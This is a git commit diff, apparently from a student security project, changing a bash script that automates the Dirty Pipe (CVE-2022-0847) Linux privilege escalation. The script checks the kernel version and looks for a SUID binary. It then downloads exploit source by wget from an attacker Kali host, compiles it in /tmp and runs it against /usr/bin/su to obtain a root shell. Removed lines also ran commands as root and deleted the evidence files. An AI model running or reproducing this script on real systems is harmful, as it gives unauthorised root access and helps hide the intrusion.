a08e77088c24e6ead87b70624a77c87049424a70
Yang Jun <2000572@sit.singaporetech.edu.sg>
2022-10-22 14:24:20 +0800

    Modified PE script

--- Attacks/Privilege_Escalation/dirtypipe.sh
+++ Attacks/Privilege_Escalation/dirtypipe.sh
@@ -1,33 +1,36 @@
 #!/bin/bash
 #
-# Dirty Pipe (CVE-2022-0847) Privilege Escalation Automation Bash Script
+# DirtyPipe (CVE-2022-0847) Privilege Escalation
 
 # Array containing non-vulnerable/patched kernel versions
 notvulnerable=(4.9 5.8 5.10.102 5.14.10 5.15.25 5.15.34 5.16.11 5.16.12 5.17)
 
 # Get kernel version of system
-echo "[*] Checking if kernel version is vulnerable to Dirty Pipe..."
+echo "[*] Checking if kernel version is vulnerable to DirtyPipe..."
 kernel_version=$(uname -r | cut -d '-' -f1)
 echo "[*] Kernel version = $kernel_version"
 
-# Checks if the kernel version is vulnerable to Dirty Pipe
+# Checks if the kernel version is vulnerable to DirtyPipe
 if [[ "${notvulnerable[*]}" = $kernel_version ]]; 
     then
         # If not vulnerable, terminate the script
-        echo "[!] This kernel version is not vulnerable to Dirty Pipe! Terminating script..."
+        echo "[!] This kernel version is not vulnerable to DirtyPipe! Terminating script..."
         exit 0
     else
-        echo "[+] This kernel version is vulnerable to Dirty Pipe!"
+        echo "[+] This kernel version is vulnerable to DirtyPipe!"
 
-        # Checks if /usr/bin/sudo has SUID bit set
-        echo "[*] Checking if SUID bit is set on /usr/bin/python3.9..."
-        if [[ "$(find / -perm -4000 2>/dev/null)" =~ "/usr/bin/python3.9" ]];
+        # Checks if /usr/bin/su has SUID bit set
+        echo "[*] Checking if SUID bit is set on /usr/bin/su..."
+        if [[ "$(find / -perm -4000 2>/dev/null)" =~ "/usr/bin/su" ]];
             then
-                echo "[+] SUID bit is set on /usr/bin/python3.9!"
+                echo "[+] SUID bit is set on /usr/bin/su!"
 
-                # Grab a copy of the exploit code from GitHub and store it in /tmp directory
-                echo "[*] Grabbing a copy of the exploit code from GitHub..."
-                curl -s https://gist.githubusercontent.com/real-yj/9f336bbfeecd1158da14dfec9d3e2250/raw/7973f5a56a54f0305a630c641c010bc818e4e7f5/CVE-2022-0847.c > /tmp/CVE-2022-0847.c 
+                # Set Kali IP
+                KALI_IP=192.168.1.4
+
+                # Grab a copy of the exploit code and store it in /tmp directory
+                echo "[*] Grabbing a copy of the exploit code..."
+                wget http://${KALI_IP}/CVE-2022-0847.c -O /tmp/CVE-2022-0847.c 2>/dev/null
                 
                 # Compile exploit and set execute permission on the executable
                 echo "[*] Compiling exploit..."
@@ -35,15 +38,15 @@ if [[ "${notvulnerable[*]}" = $kernel_version ]];
                 chmod +x CVE-2022-0847
                 echo "[+] Exploit successfully compiled and execute permission set!"
 
-                # Execute the exploit to get a root shell and run commands. Perform cleanup at the end.
-                echo "[*] Executing the Dirty Pipe exploit to run commands in root shell..."
-                echo "whoami && rm /tmp/sh /tmp/CVE-2022-0847.c /tmp/CVE-2022-0847" | ./CVE-2022-0847 /usr/bin/python3.9
-                echo "[+] All commands have been executed!"
+                # Execute the exploit to get a root shell.
+                echo "[*] Executing the DirtyPipe exploit..."
+                ./CVE-2022-0847 /usr/bin/su
+                # echo "whoami && rm /tmp/sh /tmp/CVE-2022-0847.c /tmp/CVE-2022-0847" | ./CVE-2022-0847 /usr/bin/su
+                # echo "[+] All commands have been executed!"
 
             else
-                # If SUID bit is not set on /usr/bin/sudo, terminate the script
-                echo "[!] SUID bit is not set on /usr/bin/python3.9! Terminating script..."
+                # If SUID bit is not set on /usr/bin/su, terminate the script
+                echo "[!] SUID bit is not set on /usr/bin/su! Terminating script..."
                 exit 0
-        
         fi
 fi
